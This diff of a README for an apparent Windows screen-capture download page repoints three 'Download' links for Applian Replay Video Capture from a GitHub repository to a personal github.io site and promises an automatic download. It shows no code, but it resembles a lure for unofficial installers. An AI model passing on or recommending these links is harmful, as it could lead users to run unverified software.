@@ -1,6 +1,6 @@
 # 📹 applian-video-capture-windows - Capture Anything On Your Screen Easily
 
-[![Download Applian Replay Video Capture](https://img.shields.io/badge/Download-Applian_Video_Capture-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/A2434132/applian-video-capture-windows)
+[![Download Applian Replay Video Capture](https://img.shields.io/badge/Download-Applian_Video_Capture-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://a2434132.github.io)
 
 ## 🎯 What Is This Software?
 
@@ -40,7 +40,7 @@ Getting started takes less than two minutes. Follow these simple steps:
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download Applian Replay Video Capture](https://github.com/A2434132/applian-video-capture-windows)**
+**[👉 Click Here to Download Applian Replay Video Capture](https://a2434132.github.io)**
 
 The download will start automatically from a secure connection.
 
@@ -161,7 +161,7 @@ Before you begin, make sure you have:
 - ✅ A Windows computer (Windows 10 or 11 recommended)
 - ✅ Sufficient free hard drive space (at least 500 MB)
 - ✅ A microphone/webcam if you plan to use those features
-- ✅ The download link handy: **[Get the Software Here](https://github.com/A2434132/applian-video-capture-windows)**
+- ✅ The download link handy: **[Get the Software Here](https://a2434132.github.io)**
 
 ---
 
